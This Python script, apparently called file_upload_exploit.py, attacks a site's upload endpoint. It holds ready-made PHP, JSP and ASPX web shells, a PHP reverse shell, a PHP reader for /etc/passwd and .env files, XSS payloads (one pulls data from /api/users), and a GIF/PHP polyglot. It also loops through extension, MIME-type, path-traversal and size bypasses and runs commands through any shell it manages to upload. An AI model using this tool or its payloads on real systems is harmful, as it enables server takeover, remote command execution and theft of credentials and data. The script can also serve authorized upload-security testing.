#!/usr/bin/env python3

import requests
import sys
import os
import tempfile

class FileUploadExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def create_malicious_files(self):
        print("[+] Creating malicious files for upload testing...")
        
        malicious_files = {}
        
        malicious_files['webshell.php'] = '''<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo "Web Shell Active - Use ?cmd=<command>";
}
?>'''
        
        malicious_files['webshell.jsp'] = '''<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>'''
        
        malicious_files['webshell.aspx'] = '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request.QueryString["cmd"];
if (cmd != null) {
    ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
    psi.UseShellExecute = false;
    psi.RedirectStandardOutput = true;
    Process p = Process.Start(psi);
    Response.Write(p.StandardOutput.ReadToEnd());
}
%>'''
        
        malicious_files['reverse_shell.php'] = '''<?php
set_time_limit(0);
$ip = '127.0.0.1';
$port = 4444;
$sock = fsockopen($ip, $port);
exec("/bin/bash -i <&3 >&3 2>&3", $sock);
?>'''
        
        malicious_files['info_disclosure.php'] = '''<?php
phpinfo();
echo "<br><br>Current Directory: " . getcwd();
echo "<br>Files in directory:<br>";
foreach(scandir('.') as $file) {
    echo $file . "<br>";
}
?>'''
        
        malicious_files['config_reader.php'] = '''<?php
echo "Database Configuration Attempt:<br>";
$config_files = ['/etc/passwd', '../config.php', '../../database.php', '../.env'];
foreach($config_files as $file) {
    if(file_exists($file)) {
        echo "<strong>$file:</strong><br><pre>";
        echo htmlspecialchars(file_get_contents($file));
        echo "</pre><br>";
    }
}
?>'''
        
        malicious_files['malicious.html'] = '''<!DOCTYPE html>
<html><head><title>Malicious Upload</title></head><body>
<script>
alert('XSS via File Upload!');
fetch('/api/users').then(r=>r.json()).then(data=>alert('Stolen data: '+JSON.stringify(data)));
</script>
<h1>File Upload XSS Test</h1>
</body></html>'''
        
        malicious_files['executable.bat'] = '''@echo off
echo "Malicious batch file executed!"
dir
whoami
ipconfig
'''
        
        malicious_files['executable.sh'] = '''#!/bin/bash
echo "Malicious shell script executed!"
whoami
pwd
ls -la
cat /etc/passwd 2>/dev/null || echo "No access to passwd"
'''
        
        malicious_files['zip_bomb.zip'] = b'PK\x03\x04' + b'\x00' * 1000000
        
        malicious_files['svg_xss.svg'] = '''<svg xmlns="http://www.w3.org/2000/svg" onload="alert('SVG XSS')">
<rect width="100" height="100" fill="red"/>
<script>alert('SVG Script Execution')</script>
</svg>'''
        
        return malicious_files
    
    def test_basic_file_upload(self):
        print("[+] Testing basic file upload functionality...")
        
        malicious_files = self.create_malicious_files()
        
        for filename, content in malicious_files.items():
            print(f"[INFO] Uploading: {filename}")
            
            if isinstance(content, bytes):
                files = {'file': (filename, content, 'application/octet-stream')}
            else:
                files = {'file': (filename, content, 'text/plain')}
            
            try:
                response = self.session.post(f"{self.target_url}/upload", files=files)
                
                if response.status_code == 200 and "uploaded successfully" in response.text:
                    print(f"[SUCCESS] {filename} uploaded successfully!")
                    
                    if 'webshell.php' in filename:
                        self.test_webshell_access(filename)
                    elif 'malicious.html' in filename:
                        self.test_html_execution(filename)
                        
                else:
                    print(f"[INFO] Upload failed for {filename}")
                    
            except Exception as e:
                print(f"[ERROR] Upload error for {filename}: {str(e)}")
    
    def test_webshell_access(self, filename):
        print(f"[+] Testing webshell access for {filename}...")
        
        webshell_url = f"{self.target_url}/uploads/{filename}"
        
        test_commands = ['whoami', 'pwd', 'ls', 'dir', 'id']
        
        for cmd in test_commands:
            try:
                response = self.session.get(f"{webshell_url}?cmd={cmd}")
                if response.status_code == 200 and len(response.text) > 50:
                    print(f"[CRITICAL] Webshell execution successful! Command: {cmd}")
                    print(f"Response preview: {response.text[:200]}...")
                    break
            except:
                continue
    
    def test_html_execution(self, filename):
        print(f"[+] Testing HTML/JavaScript execution for {filename}...")
        
        html_url = f"{self.target_url}/uploads/{filename}"
        
        try:
            response = self.session.get(html_url)
            if response.status_code == 200 and "script" in response.text.lower():
                print(f"[SUCCESS] HTML file accessible and contains JavaScript!")
                print(f"URL: {html_url}")
        except:
            print(f"[INFO] Could not access HTML file")
    
    def test_file_extension_bypass(self):
        print("[+] Testing file extension bypass techniques...")
        
        bypass_techniques = [
            ('webshell.php.txt', '<?php system($_GET["cmd"]); ?>'),
            ('webshell.phtml', '<?php system($_GET["cmd"]); ?>'),
            ('webshell.php3', '<?php system($_GET["cmd"]); ?>'),
            ('webshell.php4', '<?php system($_GET["cmd"]); ?>'),
            ('webshell.php5', '<?php system($_GET["cmd"]); ?>'),
            ('webshell.phps', '<?php system($_GET["cmd"]); ?>'),
            ('webshell.pht', '<?php system($_GET["cmd"]); ?>'),
            ('webshell.php%00.txt', '<?php system($_GET["cmd"]); ?>'),
            ('webshell.php.', '<?php system($_GET["cmd"]); ?>'),
            ('webshell.php::$DATA', '<?php system($_GET["cmd"]); ?>'),
            ('webshell.PHP', '<?php system($_GET["cmd"]); ?>'),
            ('webshell.PhP', '<?php system($_GET["cmd"]); ?>'),
        ]
        
        for filename, content in bypass_techniques:
            print(f"[INFO] Testing bypass: {filename}")
            
            files = {'file': (filename, content, 'text/plain')}
            
            try:
                response = self.session.post(f"{self.target_url}/upload", files=files)
                
                if response.status_code == 200 and "uploaded successfully" in response.text:
                    print(f"[SUCCESS] Extension bypass successful: {filename}")
                else:
                    print(f"[INFO] Extension bypass failed: {filename}")
                    
            except Exception as e:
                print(f"[ERROR] Bypass test error: {str(e)}")
    
    def test_mime_type_bypass(self):
        print("[+] Testing MIME type bypass techniques...")
        
        mime_bypass_tests = [
            ('webshell.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
            ('webshell.php', '<?php system($_GET["cmd"]); ?>', 'image/png'),
            ('webshell.php', '<?php system($_GET["cmd"]); ?>', 'image/gif'),
            ('malicious.html', '<script>alert("XSS")</script>', 'image/jpeg'),
            ('script.js', 'alert("JavaScript executed");', 'text/plain'),
        ]
        
        for filename, content, mime_type in mime_bypass_tests:
            print(f"[INFO] Testing MIME bypass: {filename} as {mime_type}")
            
            files = {'file': (filename, content, mime_type)}
            
            try:
                response = self.session.post(f"{self.target_url}/upload", files=files)
                
                if response.status_code == 200 and "uploaded successfully" in response.text:
                    print(f"[SUCCESS] MIME type bypass successful: {filename}")
                else:
                    print(f"[INFO] MIME type bypass failed: {filename}")
                    
            except Exception as e:
                print(f"[ERROR] MIME bypass test error: {str(e)}")
    
    def test_path_traversal_upload(self):
        print("[+] Testing path traversal in file uploads...")
        
        path_traversal_tests = [
            ('../webshell.php', '<?php system($_GET["cmd"]); ?>'),
            ('../../webshell.php', '<?php system($_GET["cmd"]); ?>'),
            ('../../../webshell.php', '<?php system($_GET["cmd"]); ?>'),
            ('..\\webshell.php', '<?php system($_GET["cmd"]); ?>'),
            ('..\\..\\webshell.php', '<?php system($_GET["cmd"]); ?>'),
            ('%2e%2e%2fwebshell.php', '<?php system($_GET["cmd"]); ?>'),
            ('%2e%2e%5cwebshell.php', '<?php system($_GET["cmd"]); ?>'),
            ('....//webshell.php', '<?php system($_GET["cmd"]); ?>'),
            ('....\\\\webshell.php', '<?php system($_GET["cmd"]); ?>'),
        ]
        
        for filename, content in path_traversal_tests:
            print(f"[INFO] Testing path traversal: {filename}")
            
            files = {'file': (filename, content, 'text/plain')}
            
            try:
                response = self.session.post(f"{self.target_url}/upload", files=files)
                
                if response.status_code == 200:
                    print(f"[WARNING] Potential path traversal: {filename}")
                    
                    traversal_url = f"{self.target_url}/{filename.replace('../', '').replace('..\\', '')}"
                    check_response = self.session.get(traversal_url)
                    
                    if check_response.status_code == 200:
                        print(f"[CRITICAL] Path traversal successful! File accessible at: {traversal_url}")
                else:
                    print(f"[INFO] Path traversal blocked: {filename}")
                    
            except Exception as e:
                print(f"[ERROR] Path traversal test error: {str(e)}")
    
    def test_file_size_bypass(self):
        print("[+] Testing file size restrictions...")
        
        size_tests = [
            ('small.php', '<?php system($_GET["cmd"]); ?>', 100),
            ('medium.php', '<?php system($_GET["cmd"]); ?>' + 'A' * 10000, 10000),
            ('large.php', '<?php system($_GET["cmd"]); ?>' + 'A' * 100000, 100000),
            ('huge.php', '<?php system($_GET["cmd"]); ?>' + 'A' * 1000000, 1000000),
        ]
        
        for filename, base_content, size in size_tests:
            content = base_content + 'A' * (size - len(base_content))
            print(f"[INFO] Testing file size: {filename} ({size} bytes)")
            
            files = {'file': (filename, content, 'text/plain')}
            
            try:
                response = self.session.post(f"{self.target_url}/upload", files=files)
                
                if response.status_code == 200 and "uploaded successfully" in response.text:
                    print(f"[SUCCESS] Large file uploaded: {filename}")
                else:
                    print(f"[INFO] File size restriction triggered: {filename}")
                    
            except Exception as e:
                print(f"[ERROR] File size test error: {str(e)}")
    
    def create_polyglot_file(self):
        print("[+] Creating polyglot file (valid image + PHP code)...")
        
        gif_header = b'GIF89a'
        php_code = b'<?php system($_GET["cmd"]); ?>'
        
        polyglot_content = gif_header + b'\x00' * 100 + php_code
        
        files = {'file': ('polyglot.gif', polyglot_content, 'image/gif')}
        
        try:
            response = self.session.post(f"{self.target_url}/upload", files=files)
            
            if response.status_code == 200 and "uploaded successfully" in response.text:
                print("[SUCCESS] Polyglot file uploaded successfully!")
                
                polyglot_url = f"{self.target_url}/uploads/polyglot.gif"
                test_response = self.session.get(f"{polyglot_url}?cmd=whoami")
                
                if test_response.status_code == 200 and len(test_response.text) > 50:
                    print("[CRITICAL] Polyglot file executed as PHP!")
                else:
                    print("[INFO] Polyglot file uploaded but not executed")
            else:
                print("[INFO] Polyglot file upload failed")
                
        except Exception as e:
            print(f"[ERROR] Polyglot test error: {str(e)}")
    
    def run_all_tests(self):
        print("=" * 60)
        print("FILE UPLOAD VULNERABILITY TESTING")
        print("=" * 60)
        
        self.test_basic_file_upload()
        print()
        self.test_file_extension_bypass()
        print()
        self.test_mime_type_bypass()
        print()
        self.test_path_traversal_upload()
        print()
        self.test_file_size_bypass()
        print()
        self.create_polyglot_file()
        
        print("\n[INFO] File upload testing completed!")
        print("[INFO] Check the /uploads/ directory for uploaded files")
        print("[INFO] Try accessing uploaded PHP files with ?cmd=<command> parameter")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 file_upload_exploit.py <target_url>")
        print("Example: python3 file_upload_exploit.py http://localhost:3000")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip('/')
    exploit = FileUploadExploit(target_url)
    exploit.run_all_tests()

if __name__ == "__main__":
    main()